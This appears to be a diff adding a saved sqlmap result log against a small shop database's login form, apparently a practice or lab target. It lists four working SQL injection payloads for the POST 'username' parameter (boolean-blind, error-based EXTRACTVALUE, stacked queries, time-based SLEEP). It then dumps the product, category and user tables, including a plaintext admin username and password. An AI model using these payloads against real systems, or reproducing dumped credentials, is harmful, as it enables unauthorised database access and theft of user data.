@@ -1,0 +1,51 @@
+sqlmap identified the following injection point(s) with a total of 366 HTTP(s) requests:
+---
+Parameter: username (POST)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)
+    Payload: username=admin%' OR NOT 6543=6543#&password=123
+
+    Type: error-based
+    Title: MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)
+    Payload: username=admin%' AND EXTRACTVALUE(9967,CONCAT(0x5c,0x7162716a71,(SELECT (ELT(9967=9967,1))),0x7171787a71)) AND 'LcQZ%'='LcQZ&password=123
+
+    Type: stacked queries
+    Title: MySQL >= 5.0.12 stacked queries (comment)
+    Payload: username=admin%';SELECT SLEEP(5)#&password=123
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: username=admin%' AND (SELECT 1557 FROM (SELECT(SLEEP(5)))WKVo) AND 'QbjC%'='QbjC&password=123
+---
+back-end DBMS: MySQL >= 5.1 (MariaDB fork)
+Database: tienda_db
+Table: categorias
+[2 entries]
++----+------------+-------------------------------+
+| id | nombre     | descripcion                   |
++----+------------+-------------------------------+
+| 3  | Limpieza   | Productos para limpieza\\r\\n |
+| 4  | Tecnologia | Productos electronicos\\r\\n  |
++----+------------+-------------------------------+
+
+Database: tienda_db
+Table: productos
+[4 entries]
++----+--------------+-------+------------------+--------+------------------------------+
+| id | categoria_id | stock | nombre           | precio | descripcion                  |
++----+--------------+-------+------------------+--------+------------------------------+
+| 6  | 3            | 44    | Jabon HM         | 3.00   | Jabon con esencia a vainilla |
+| 7  | 3            | 33    | Pasta de dientes | 1.00   | Pasta de dientes con menta   |
+| 8  | 4            | 11    | Pilas 3AAA       | 2.00   | Pilas para linterna 3AAA     |
+| 9  | 3            | 11    | TEST             | 1.00   | TEST                         |
++----+--------------+-------+------------------+--------+------------------------------+
+
+Database: tienda_db
+Table: usuarios
+[1 entry]
++----+----------+----------+
+| id | password | username |
++----+----------+----------+
+| 1  | admin123 | admin    |
++----+----------+----------+
+
